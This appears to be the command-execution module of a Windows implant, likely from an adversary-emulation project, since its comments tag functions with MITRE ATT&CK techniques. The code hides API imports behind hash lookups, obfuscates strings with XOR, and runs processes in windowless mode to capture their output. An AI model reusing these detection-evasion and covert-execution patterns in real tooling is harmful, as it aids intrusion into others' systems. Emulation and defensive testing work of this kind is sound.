#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <vector>
#include <string>
#include <format>
#include "crypto/xor_obfuscation.hpp"
#include "execute.hpp"
#include "logger.hpp"
#include "util/string_util.hpp"
#include "util/winapihelper.hpp"

#define PIPE_READ_BUFFER_SIZE 100*1024
#define WAIT_CHUNK_MS 100

namespace execute {

/*
 * SpawnProcessNoWait:
 *      About:
 *          Create a process using the given command line, but does not collect output or wait for process
 *          to terminate. Leverages the CreateProcessW API call.
 *      Returns:
 *          Returns ERROR_SUCCESS on success, non-zero error code otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 */
DWORD SpawnProcessNoWait(LPWSTR command_line) {
    DWORD error_code;
    FP_CreateProcessW createProcessW = (FP_CreateProcessW)winapi_helper::GetAPI(0xaeb52e2f, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (createProcessW == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for CreateProcessW. Error code"), error_code));
        return error_code;
    }

    PROCESS_INFORMATION process_info; // for created process
    STARTUPINFOW startup_info; // specify how to start process
    ZeroMemory(&startup_info, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);
    if (createProcessW(
        NULL, // module name included in command line
        command_line,
        NULL, 
        NULL,
        FALSE, // inherit our output pipe handle
        CREATE_NO_WINDOW, // dwCreationFlags
        NULL, // use environment of calling process
        NULL, // use current dir of calling process
        &startup_info,
        &process_info
    )) {
        return ERROR_SUCCESS;
    } else {
        return GetLastError();
    }
}

/*
 * CreateTaskProcess:
 *      About:
 *          Create a process using the given command line, using the CreateProcessW API call.
 *      Result:
 *          Returns true on success, false otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *      Other References:
 *          https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
 *          https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
 *          https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
 *          https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
 *          https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)
 */
BOOL CreateTaskProcess(LPWSTR command_line, HANDLE h_output_pipe, PROCESS_INFORMATION* process_info) {
    DWORD error_code;
    FP_CreateProcessW createProcessW = (FP_CreateProcessW)winapi_helper::GetAPI(0xaeb52e2f, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (createProcessW == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for CreateProcessW. Error code"), error_code));
        return false;
    }
    
    STARTUPINFOW startup_info; // specify how to start process
    ZeroMemory(&startup_info, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags = STARTF_USESTDHANDLES;
    startup_info.hStdOutput = h_output_pipe;
    startup_info.hStdError = h_output_pipe;
    return createProcessW(
        NULL, // module name included in command line
        command_line,
        NULL, 
        NULL,
        TRUE, // inherit our output pipe handle
        CREATE_NO_WINDOW, // dwCreationFlags
        NULL, // use environment of calling process
        NULL, // use current dir of calling process
        &startup_info,
        process_info
    );
}

// Get process output, wait for process to finish or timeout, and close process handles.
std::vector<char> GetProcessOutputAndCleanupTaskProcess(
    HANDLE h_pipe_rd, 
    PROCESS_INFORMATION* process_info,
    DWORD timeout_seconds,
    DWORD* error_code,
    DWORD* exit_code
) {
    std::vector<char> v_output;
    FP_GetExitCodeProcess getExitCodeProcess = (FP_GetExitCodeProcess)winapi_helper::GetAPI(0xe21026f9, XOR_WIDE_LIT(L"Kernel32.dll"), error_code);
    if (getExitCodeProcess == NULL || *error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for GetExitCodeProcess. Error code"), *error_code));
        return v_output;
    }
    FP_PeekNamedPipe peekNamedPipe = (FP_PeekNamedPipe)winapi_helper::GetAPI(0x94f08b9d, XOR_WIDE_LIT(L"Kernel32.dll"), error_code);
    if (peekNamedPipe == NULL || *error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for PeekNamedPipe. Error code"), *error_code));
        return v_output;
    }
    FP_WaitForSingleObject waitForSingleObject = (FP_WaitForSingleObject)winapi_helper::GetAPI(0xeccda1ba, XOR_WIDE_LIT(L"Kernel32.dll"), error_code);
    if (waitForSingleObject == NULL || *error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for WaitForSingleObject. Error code"), *error_code));
        return v_output;
    }

    BOOL result;
    std::string log_msg;
    char response_buffer[PIPE_READ_BUFFER_SIZE];
    DWORD num_bytes_read = 0;
    DWORD total_bytes_read = 0;
    DWORD error;

    size_t total_time_waited = 0;
    DWORD wait_limit_ms = timeout_seconds * 1000;
    BOOL finished = FALSE;
    *error_code = ERROR_SUCCESS;
    do {
        DWORD wait_result = waitForSingleObject(process_info->hProcess, WAIT_CHUNK_MS);
        total_time_waited += WAIT_CHUNK_MS;

        if (wait_result == WAIT_OBJECT_0) {
            // Process finished. Grab exit code
            finished = TRUE;
            if (!getExitCodeProcess(process_info->hProcess, exit_code)) {
                *error_code = GetLastError();
                log_msg = XOR_LIT("Failed to get process exit code. Error code: ") + std::to_string(*error_code);
                XorLogger::LogError(log_msg);
            } else {
                log_msg = XOR_LIT("Process exited with exit code: ") + std::to_string(*exit_code);
                XorLogger::LogDebug(log_msg);
            }
        } else if (wait_result == WAIT_FAILED) {
            *error_code = GetLastError();
            log_msg = XOR_LIT("Failed to wait for process. Error code: ") + std::to_string(*error_code);
            XorLogger::LogError(log_msg);
            CloseHandle(process_info->hProcess);
            CloseHandle(process_info->hThread);
            return v_output;
        }

        // Process either finished or this current wait round elapsed. Read some output to free up buffers if needed.
        while(TRUE) {
            DWORD available = 0;

            // check if we have data available in the pipe
            if (!peekNamedPipe(h_pipe_rd, NULL, 0, NULL, &available, NULL)) {
                break;
            }
            if (!available) {
                break;
            }
            result = ReadFile(
                h_pipe_rd,
                response_buffer,
                PIPE_READ_BUFFER_SIZE,
                &num_bytes_read,
                NULL
            );

            total_bytes_read += num_bytes_read;
            if (num_bytes_read > 0) {
                v_output.insert(v_output.end(), response_buffer, response_buffer + num_bytes_read);
            }
            if (!result) {
                error = GetLastError();
                if (error == ERROR_BROKEN_PIPE) {
                    // End of pipe. Normal flow.
                    break;
                } else if (error != ERROR_MORE_DATA) {
                    *error_code = error;
                    CloseHandle(process_info->hProcess);
                    CloseHandle(process_info->hThread);
                    log_msg = XOR_LIT("Failed to read from output pipe. Error code: ") + std::to_string(*error_code);
                    XorLogger::LogError(log_msg);
                    return v_output;
                }
            }
        }

        if (total_time_waited >= wait_limit_ms) {
            XorLogger::LogWarning(XOR_LIT("Process timed out."));
            *error_code = FAIL_TIMEOUT_REACHED;
            finished = TRUE;
        }
    } while (!finished);
    CloseHandle(process_info->hProcess);
    CloseHandle(process_info->hThread);
    XorLogger::LogDebug(std::format("Received {} {}.", total_bytes_read, XOR_LIT("total output bytes from process")));
    return v_output;
}

/*
 * ExecuteProcess:
 *      About:
 *          Create a process using the given command line and return its output, using the CreateProcessW API call.
 *      Result:
 *          Returns a char vector of process output on success. error_code will be populated with ERROR_SUCCESS on success, otherwise
 *          some other error code.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *          T1057: Process Discovery
 *          T1559: Inter-Process Communication
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output
 */
std::vector<char> ExecuteProcess(LPWSTR command_line, DWORD timeout_seconds, DWORD* error_code, DWORD* exit_code) {
    std::vector<char> output;
    std::string log_msg;
    FP_CreatePipe createPipe = (FP_CreatePipe)winapi_helper::GetAPI(0x9a8deee7, XOR_WIDE_LIT(L"Kernel32.dll"), error_code);
    if (createPipe == NULL || *error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for CreatePipe. Error code"), *error_code));
        return output;
    }
    FP_SetHandleInformation setHandleInformation = (FP_SetHandleInformation)winapi_helper::GetAPI(0x70ea2e03, XOR_WIDE_LIT(L"Kernel32.dll"), error_code);
    if (setHandleInformation == NULL || *error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for SetHandleInformation. Error code"), *error_code));
        return output;
    }

    // Allow our pipe handle to be inherited and set lax security attributes
    SECURITY_ATTRIBUTES pipe_sa; 
    pipe_sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    pipe_sa.bInheritHandle = TRUE;
    pipe_sa.lpSecurityDescriptor = NULL;

    // Create named pipe to retrieve output
    HANDLE h_pipe_output_rd = NULL;
    HANDLE h_pipe_output_wr = NULL;
    if (!createPipe(&h_pipe_output_rd, &h_pipe_output_wr, &pipe_sa, 0)) {
        *error_code = GetLastError();
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to create pipe for process stdout. Error code"), *error_code));
        return output;
    }
    if (LocalFree(pipe_sa.lpSecurityDescriptor) != NULL) {
        *error_code = GetLastError();
        CloseHandle(h_pipe_output_wr);
        CloseHandle(h_pipe_output_rd);
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to free memory for pipe security descriptor. Error code"), *error_code));
        return output;
    }

    // Set pipe handle
    if (!setHandleInformation(h_pipe_output_rd, HANDLE_FLAG_INHERIT, 0)) {
        *error_code = GetLastError();
        CloseHandle(h_pipe_output_wr);
        CloseHandle(h_pipe_output_rd);
        log_msg = XOR_LIT("Failed to set handle for stdout pipe. Error code: ") + std::to_string(*error_code);
        XorLogger::LogError(log_msg);
        return output;
    }

    // Create process, output to pipe we created
    XorLogger::LogDebug(XOR_LIT("Creating process."));
    PROCESS_INFORMATION process_info; // for created process
    if (!CreateTaskProcess(command_line, h_pipe_output_wr, &process_info)) {
        *error_code = GetLastError();
        CloseHandle(h_pipe_output_rd);
        CloseHandle(h_pipe_output_wr); 
        log_msg = XOR_LIT("Failed to create process. Error code: ") + std::to_string(*error_code);
        XorLogger::LogError(log_msg);
        return output;
    }

    XorLogger::LogInfo(std::format(
        "{} {} {} {}",
        XOR_LIT("Created process with ID"),
        process_info.dwProcessId,
        XOR_LIT("and command"),
        string_util::wstring_to_string(std::wstring(command_line))
    ));

    // Get process output and wait for it to finish
    output = GetProcessOutputAndCleanupTaskProcess(h_pipe_output_rd, &process_info, timeout_seconds, error_code, exit_code);
    CloseHandle(h_pipe_output_wr);
    CloseHandle(h_pipe_output_rd);
    return output;
}

} // namespace execute